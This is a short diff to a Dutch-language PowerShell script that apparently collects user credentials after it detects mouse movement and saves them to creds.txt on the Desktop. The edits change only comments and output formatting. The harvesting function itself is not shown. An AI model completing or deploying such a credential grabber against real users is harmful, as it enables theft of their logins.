@@ -3,7 +3,7 @@ $DesktopPath = [Environment]::GetFolderPath('Desktop')
 $FileName = "creds.txt"
 $FullPath = Join-Path -Path $DesktopPath -ChildPath $FileName
 
-# Controleer of creds.txt al bestaat
+# Controleer of het bestand al bestaat
 if (Test-Path -Path $FullPath) {
     Write-Host "Het bestand 'creds.txt' bestaat al. Het script wordt niet verder uitgevoerd."
     exit
@@ -33,7 +33,7 @@ function Get-Creds {
     }
 }
 
-# Functie: Wacht tot er muisbeweging wordt gedetecteerd
+# Functie: Wacht op muisbeweging
 function Wait-ForMouseMovement {
     Add-Type -AssemblyName System.Windows.Forms
     $originalPosition = [System.Windows.Forms.Cursor]::Position
@@ -69,7 +69,7 @@ $creds = Get-Creds
 
 # Bewaar de verzamelde gegevens op het bureaublad
 try {
-    $creds | Out-File -FilePath $FullPath -Encoding UTF8 -Append
+    $creds | Format-Table | Out-File -FilePath $FullPath -Encoding UTF8 -Append
     Write-Host "Referenties zijn opgeslagen in $FullPath"
 } catch {
     Write-Host "Er is een fout opgetreden bij het opslaan van de referenties: $($_.Exception.Message)"
